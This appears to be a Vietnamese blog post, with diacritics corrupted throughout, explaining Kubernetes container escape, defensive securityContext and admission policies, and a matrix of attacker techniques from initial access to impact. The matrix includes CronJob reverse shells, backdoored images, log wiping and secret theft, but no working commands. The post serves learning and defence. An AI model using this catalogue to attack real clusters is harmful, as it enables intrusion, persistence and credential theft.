N�i c�ch kh�c, n?u m?t container du?c c?u h�nh sai, attacker c� th? kh�ng c?n �hack kernel� m� v?n c� du?ng h?p l? d? ch?m t?i host ho?c cluster.

M?t s? nguy�n nh�n ph? bi?n d?n t?i container escape g?m:

- Container ch?y b?ng user�root.
- Container du?c c?p�privileged: true.
- Container c� capability nguy hi?m nhu�CAP_SYS_ADMIN.
- Pod mount host filesystem b?ng�hostPath.
- Container c� th? truy c?p socket nh?y c?m nhu Docker/container runtime socket.
- Service account token trong pod c� quy?n qu� r?ng.
- Workload c� th? g?i cloud metadata API d? l?y credential.
- Kernel ho?c container runtime c� CVE chua du?c v�.
- App b�n trong container b? RCE, sau d� attacker d�ng quy?n hi?n c� d? pivot.

�i?m quan tr?ng l� container kh�ng ph?i l� m?t �m�y ?o nh?� v?i boundary c?ng nhu nhi?u ngu?i tu?ng. Container d�ng chung kernel v?i host, n�n n?u attacker c� d? quy?n b�n trong container, d?c bi?t l� root c?ng th�m capability nguy hi?m, ranh gi?i b?o m?t s? tr? n�n r?t m?ng.

V� d?, n?u m?t container ch?y ? ch? d? privileged v� c� quy?n mount thi?t b? c?a host, attacker c� th? tuong t�c v?i filesystem b�n ngo�i container. Khi d� container kh�ng c�n ch? nh�n th?y filesystem ri�ng c?a n� n?a, m� c� th? nh�n th?y ho?c ghi v�o filesystem c?a node. ��y l� m?t d?ng breakout r?t nguy hi?m v� attacker c� th? d?t persistence, d?c d? li?u nh?y c?m, ho?c can thi?p v�o c?u h�nh host.

Tuy nhi�n, kh�ng ph?i container n�o cung d? breakout. N?u workload ch?y b?ng non-root user, b? drop capabilities, filesystem ch? d?c, kh�ng c� hostPath nguy hi?m, v� du?c gi?i h?n b?i AppArmor/SELinux/seccomp, th� r?t nhi?u k? thu?t escape s? b? v� hi?u h�a ho?c kh� th?c hi?n hon nhi?u.

V� v?y, trong ph�ng th? Kubernetes, c?n ch� � c�c c?u h�nh sau:

```
securityContext:
  runAsNonRoot: true
  runAsUser: 1000
  allowPrivilegeEscalation: false
  readOnlyRootFilesystem: true
  capabilities:
    drop:
      - ALL
```

Ngo�i ra, ? c?p cluster n�n d�ng admission control d? ch?n c�c workload nguy hi?m, v� d?:

- Kh�ng cho ph�p�privileged: true.
- Kh�ng cho ph�p container ch?y b?ng root n?u kh�ng c� l� do r� r�ng.
- Kh�ng cho ph�p mount hostPath t�y ti?n.
- Kh�ng cho ph�p th�m capability nguy hi?m.
- B?t bu?c d�ng seccomp profile.
- B?t bu?c AppArmor ho?c SELinux policy n?u m�i tru?ng h? tr?.
- Gi?i h?n quy?n c?a service account theo nguy�n t?c least privilege.

M?t di?m c?n nh? l� trong Kubernetes,�**pod thu?ng l� trust boundary**, kh�ng ph?i t?ng container ri�ng l?. C�c container trong c�ng m?t pod c� th? chia s? network namespace, volume, v� m?t s? t�i nguy�n kh�c. V� v?y n?u m?t container trong pod b? compromise, c�c container c�n l?i trong c�ng pod cung n�n du?c xem l� c� nguy co b? ?nh hu?ng.

Container breakout cung c� th? di theo hu?ng kh�ng tr?c ti?p ph� kernel, m� pivot sang c�c th�nh ph?n kh�c:

- �?c service account token r?i g?i Kubernetes API.
- D� c�c service n?i b? trong cluster.
- Truy c?p cloud metadata service d? l?y temporary credential.
- T�m secret trong environment variable ho?c config file.
- T?n c�ng kubelet API n?u node expose sai.
- L?m d?ng workload identity d? truy c?p cloud resources.

�i?u n�y cho th?y breakout kh�ng ch? l� �tho�t kh?i container ra host�, m� c�n l� b?t k? c�ch n�o ph� v? gi? d?nh isolation ban d?u c?a operator. N?u workload ch? d�ng l? du?c ph�p ch?y app, nhung attacker d�ng n� d? d?c Secret, di?u khi?n API server, ho?c truy c?p cloud account, th� v? m?t r?i ro n� v?n l� m?t d?ng isolation failure nghi�m tr?ng.

T�m l?i, container escape thu?ng d?n t? ba nh�m nguy�n nh�n ch�nh:

1. **L? h?ng k? thu?t**  
    Kernel bug, container runtime CVE, filesystem bug, network stack bug.
    
2. **C?u h�nh sai**  
    Privileged container, root user, hostPath mount, capability du th?a, thi?u seccomp/AppArmor/SELinux.
    
3. **Pivot qua credential ho?c control plane**  
    Service account token, kubeconfig, cloud metadata, workload identity, Kubernetes API, kubelet API.


### Ph�ng th? cho badpods

Trong Kubernetes, RBAC ch? ki?m tra m?t identity c� du?c ph�p t?o Pod hay kh�ng. Tuy nhi�n, RBAC kh�ng d? d? d�nh gi� Pod d� c� an to�n hay kh�ng. V� v?y Kubernetes c?n th�m l?p Admission Controller d? ki?m tra n?i dung Pod tru?c khi cho ph�p t?o.

C�c co ch? nhu Pod Security Admission, Kyverno ho?c OPA Gatekeeper c� th? ch?n nh?ng c?u h�nh nguy hi?m nhu `privileged: true`, `hostPID`, `hostNetwork` ho?c `hostPath`. ��y l� l?p ph�ng th? quan tr?ng d? ngan attacker bi?n quy?n `create pods` th�nh kh? nang truy c?p Node.

T�m l?i, d? gi?m r?i ro Pod escape, c?n k?t h?p hai l?p ki?m so�t: RBAC gi?i h?n ai du?c t?o Pod, v� Admission Policy gi?i h?n Pod du?c ph�p ch?a c?u h�nh g�.



��y l� so d? t?n c�ng m� m�nh ki?m du?c tr�n m?ng khi b?n c� th? ti?p c?n cluster t? c�c hu?ng kh�c nhau 

![](/assets/images/posts/Pasted%20image%2020260524172250.png)

N� cho th?y attacker c� th? ti?p c?n cluster t? nhi?u hu?ng kh�c nhau:

- **Access API server**: attacker ho?c user c� credential c� th? g?i tr?c ti?p Kubernetes API server.
- **Misconfigured Kubernetes dashboard**: dashboard c?u h�nh sai c� th? cho ph�p truy c?p cluster qua UI.
- **Malicious container image in registry**: image d?c h?i du?c push l�n container registry, sau d� du?c deploy v�o cluster.
- **Vulnerable application**: app ch?y trong pod c� l? h?ng, attacker khai th�c app r?i pivot v�o pod/cluster.
- **Misconfigured Docker daemon**: Docker daemon expose sai c?u h�nh, attacker c� th? di?u khi?n container/node.
- **Developer/DevOps**: t�i kho?n ho?c m�y c?a developer/devops b? compromise, t? d� ?nh hu?ng registry ho?c cluster.

B�n trong h�nh c� 2 v�ng ch�nh:

**Master / control plane**  
B�n tr�i l� th�nh ph?n di?u khi?n Kubernetes:

- API server: c?ng trung t�m d? m?i th? giao ti?p v?i cluster.
- etcd: noi luu state/secret/config c?a cluster.
- Scheduler: quy?t d?nh pod ch?y ? node n�o.
- controller manager: di?u ph?i tr?ng th�i cluster.
- K8s dashboard: giao di?n web qu?n tr? cluster n?u c� c�i.

**Node / worker node**  
B�n ph?i l� m�y ch?y workload:

- kubelet: agent tr�n node, nh?n l?nh t? API server d? ch?y pod.
- kube-proxy: x? l� networking/service routing.
- Pod: noi container/app ch?y.
- API: c� th? l� app API b�n trong pod.

C�c nh�n nhu�**Peirates**,�**kube-hunter**,�**BOB**,�**Deepce**�l� c�ng c? b?o m?t/offensive Kubernetes/container thu?ng d�ng d? ki?m tra ho?c khai th�c c?u h�nh y?u:

- kube-hunter: scanner t�m l? h?ng/c?u h�nh y?u trong Kubernetes.
- Peirates: c�ng c? h? tr? privilege escalation v� discovery trong Kubernetes.
- BOB,�Deepce: c�ng c? li�n quan d?n container/Kubernetes enumeration ho?c escape-checking.

**Kubernetes c� nhi?u di?m v�o**, kh�ng ch? m?i API server. Attacker c� th? di t? app l?i, dashboard c?u h�nh sai, image d?c, Docker daemon expose, registry, developer account, ho?c credential b? l?. Khi d� v�o du?c m?t pod ho?c node, h? c� th? ti?p t?c enumerate, pivot, leo thang quy?n, ho?c t�c d?ng d?n control plane n?u c?u h�nh cluster y?u.

![](/assets/images/posts/Pasted%20image%2020260524175900.png)

Ho?c l� ki thu?t reverse shell trong 1 container b? compromise


![](/assets/images/posts/Pasted%20image%2020260524180647.png)


### Attack surface cho K8s

![](/assets/images/posts/Pasted%20image%2020260524211855.png)



|Initial access (popping a shell pt 1 - prep)|Execution (popping a shell pt 2 - exec)|Persistence (keeping the shell)|Privilege escalation (container breakout)|Defense evasion (assuming no IDS)|Credential access (juicy creds)|Discovery (enumerate possible pivots)|Lateral movement (pivot)|Command & control (C2 methods)|Impact (dangers)|
|---|---|---|---|---|---|---|---|---|---|
|Using cloud credentials: service account keys, impersonation|Exec into container (bypass admission control policy)|Backdoor container (add a reverse shell to local or container registry image)|Privileged container (legitimate escalation to host)|Clear container logs (covering tracks after host breakout)|List K8s Secrets|List K8s API server (nmap, curl)|Access cloud resources (workload identity and cloud integrations)|Dynamic resolution (DNS tunneling)|Data destruction (datastores, files, NAS, ransomware�)|
|Compromised images in registry (supply chain unpatched or malicious)|BASH/CMD inside container (implant or trojan, RCE/reverse shell, malware, C2, DNS tunneling)|Writable host path mount (host mount breakout)|Cluster admin role binding (untested RBAC)|Delete K8s events (covering tracks after host breakout)|Mount service principal (Azure specific)|Access�`kubelet`�API|Container service account (API server)|App protocols (L7 protocols, TLS, �)|Resource hijacking (cryptojacking, malware C2/distribution, open relays, botnet membership)|
|Application vulnerability (supply chain unpatched or malicious)|Start new container (with malicious payload: persistence, enumeration, observation, escalation)|K8s CronJob (reverse shell on a timer)|Access cloud resources (metadata attack via workload identity)|Connect from proxy server (to cover source IP, external to cluster)|Applications credentials in config files (key material)|Access K8s dashboard (UI requires service account credentials)|Cluster internal networking (attack neighboring pods or systems)|Botnet (k3d, or traditional)|Application DoS|
|kubeconfig file (exfiltrated, or uploaded to the wrong place)|Application exploit (RCE)|Static pods (reverse shell, shadow API server to read audit-log-only headers)|Pod�`hostPath`�mount (logs to container breakout)|Pod/container name similarity (visual evasion, CronJob attack)|Access container service account (RBAC lateral jumps)|Network mapping (nmap, curl)|Access container service account (RBAC lateral jumps)||Node scheduling DoS|
|Compromise user endpoint (2FA and federating auth mitigate)|SSH server inside container (bad practice)|Injected sidecar containers (malicious mutating webhook)|Node to cluster escalation (stolen credentials, node label rebinding attack)|Dynamic resolution (DNS) (DNS tunneling/exfiltration)|Compromise admission controllers|Instance metadata API (workload identity)|Host writable volume mounts||Service discovery DoS|
|K8s API server vulnerability (needs CVE and unpatched API server)|Container lifecycle hooks (`postStart`�and�`preStop`�events in pod YAML)|Rewrite container lifecycle hooks (`postStart`�and�`preStop`�events in pod YAML)|Control plane to cloud escalation (keys in Secrets, cloud or control plane credentials)|Shadow admission control or API server||Compromise K8s Operator (sensitive RBAC)|Access K8s dashboard||PII or IP exfiltration (cluster or cloud datastores, local accounts)|
|Compromised host (credentials leak/stuffing, unpatched services, supply chain compromise)||Rewrite liveness probes (exec into and reverse shell in container)|Compromise admission controller (reconfigure and bypass to allow blocked image with flag)|||Access host filesystem (host mounts)|Access tiller endpoint (Helm v3 negates this)||Container pull rate limit DoS (container registry)|
|Compromised�`etcd`�(missing auth)||Shadow admission control or API server (privileged RBAC, reverse shell)|Compromise K8s Operator (compromise flux and read any Secrets)||||Access K8s Operator||SOC/SIEM DoS (event/audit/log rate limit)|
|||K3d botnet (secondary cluster running on compromised nodes)|Container breakout (kernel or runtime vulnerability e.g., DirtyCOW, `/proc/self/exe`, eBPF verifier bugs, Netfilter)||

�o?n n�y l� m?t b?ng attack chain cho m�i tru?ng�**container / Kubernetes / cloud**. M?i c?t l� m?t giai do?n trong v�ng d?i t?n c�ng, c�n m?i d�ng l� v� d? k? thu?t m� attacker c� th? d�ng ? giai do?n d�.

N�i ng?n g?n: n� m� t? attacker di t?�**c� quy?n ban d?u**, ch?y l?nh trong container, gi? quy?n truy c?p, leo thang ra host ho?c cluster, n� ph�t hi?n, l?y credential, d� h? th?ng, pivot sang noi kh�c, thi?t l?p C2, r?i g�y t�c d?ng.

**C�c c?t nghia l� g�**

Initial access  
C�ch attacker v�o du?c h? th?ng ban d?u. V� d?: l? cloud credential, kubeconfig b? leak, app c� RCE, image trong registry b? c�i m� d?c, endpoint ngu?i d�ng b? compromise.

Execution  
Sau khi v�o du?c, attacker ch?y code/l?nh. V� d?: exec v�o container, ch?y bash/cmd, t?o container m?i ch?a payload, khai th�c app d? RCE.

Persistence  
Gi? quy?n truy c?p l�u d�i. V� d?: backdoor image, CronJob ch?y reverse shell theo l?ch, static pod, SSH server trong container, lifecycle hook d?c h?i.

Privilege escalation  
Leo thang quy?n. Trong Kubernetes thu?ng l� t? pod/container l�n node, t? node l�n cluster, ho?c t? cluster l�n cloud. V� d?: privileged container, writable hostPath mount, kubelet API, RBAC qu� r?ng, container breakout qua kernel/runtime bug.

Defense evasion  
N� ph�t hi?n. V� d?: x�a container logs, x�a Kubernetes events, d�ng t�n pod/container gi?ng workload h?p ph�p, shadow API server/admission controller, bypass admission policy.

Credential access  
T�m v� l?y credential. V� d?: list K8s Secrets, d?c service account token, cloud service principal, workload identity token, kubeconfig, credential trong config file, etcd kh�ng b?o v?.

Discovery  
D� h? th?ng d? t�m pivot. V� d?: list Kubernetes API server, nmap/curl m?ng n?i b? cluster, truy c?p dashboard, kubelet API, operator, service discovery, cloud metadata.

Lateral movement  
Di chuy?n ngang sang pod/node/service/cloud kh�c. V� d?: d�ng service account d? g?i API server, workload identity d? v�o cloud resources, attack neighboring pods, truy c?p dashboard/operator/tiller.

Command & control  
K�nh di?u khi?n t? xa. V� d?: DNS tunneling, proxy server d? che IP ngu?n, app protocol nhu HTTPS/TLS, botnet, malware C2.

Impact  
H?u qu? cu?i c�ng. V� d?: x�a d? li?u, ransomware, cryptojacking, DoS app/node/service discovery/SIEM, exfiltration PII/IP, botnet, ph� container registry.

**M?t v�i v� d? d? hi?u**

Using cloud credentials: service account keys, impersonation  
N?u attacker c� key cloud ho?c quy?n impersonate service account, h? c� th? v�o cloud project/subscription tru?c, r?i t? d� t�m cluster ho?c workload li�n quan.

Exec into container  
Attacker c� quy?n ho?c l? h?ng cho ph�p m? shell b�n trong container. ��y l� bu?c �d� v�o du?c workload�.

Privileged container  
Container ch?y v?i quy?n qu� cao, c� th? truy c?p thi?t b?/kernel capability c?a host. ��y l� r?i ro l?n v� c� th? d?n t?i host compromise.

Writable host path mount�/�Host writable volume mounts  
Pod mount thu m?c t? host v� c� quy?n ghi. N?u mount nh?y c?m, attacker c� th? s?a file tr�n node ho?c d?t persistence.

List K8s Secrets  
N?u RBAC cho ph�p d?c Secret, attacker c� th? l?y token, database password, cloud key, TLS key.

Instance metadata API  
Pod g?i metadata service c?a cloud d? l?y token t?m th?i. N?u workload identity/metadata protection c?u h�nh sai, attacker c� th? d�ng token d� truy c?p cloud resources.

K8s CronJob reverse shell on a timer  
M?t c�ch persistence: t?o CronJob d?nh k? g?i v? attacker. V? ph�ng th?, n�n audit CronJob l? v� RBAC t?o workload.

Shadow admission control or API server  
Attacker d?ng th�nh ph?n gi? ho?c d?c h?i d? d�nh l?a/ghi nh?n th�ng tin nh?y c?m ho?c bypass ch�nh s�ch.

SOC/SIEM DoS  
T?o qu� nhi?u log/event/audit d? l�m ngh?n h? th?ng gi�m s�t, khi?n c?nh b�o th?t kh� th?y hon.

**� ch�nh c?a to�n b? b?ng**

��y kh�ng ph?i l� m?t checklist �l�m theo d? hack�, m� l� b?n d? r?i ro d? defender/red team hi?u:

- �u?ng v�o c� th? d?n t? app, image, kubeconfig, cloud key, ngu?i d�ng, registry.
- Container kh�ng ph?i bi�n gi?i b?o m?t tuy?t d?i.
- RBAC, Secrets, service account v� workload identity l� v�ng c?c k? nh?y c?m.
- hostPath, privileged pod, kubelet API, metadata API l� c�c di?m breakout/pivot ph? bi?n.
- Persistence trong Kubernetes thu?ng ?n trong CronJob, static pod, lifecycle hook, webhook, operator.
- Impact kh�ng ch? l� m?t d? li?u, m� c�n cryptojacking, botnet, DoS, supply chain compromise.

Hi?n t?i tui m?i nghi�n c?u t?i d�y th�i v� m?ng n�y cung kh� l� r?ng , s?p t?i tui s? d?ng lab v� s? m� ph?ng c�c ki thu?t t?n c�ng th?c t? hon. C?m on c�c b?n d� d�nh thu?i gian d?c.



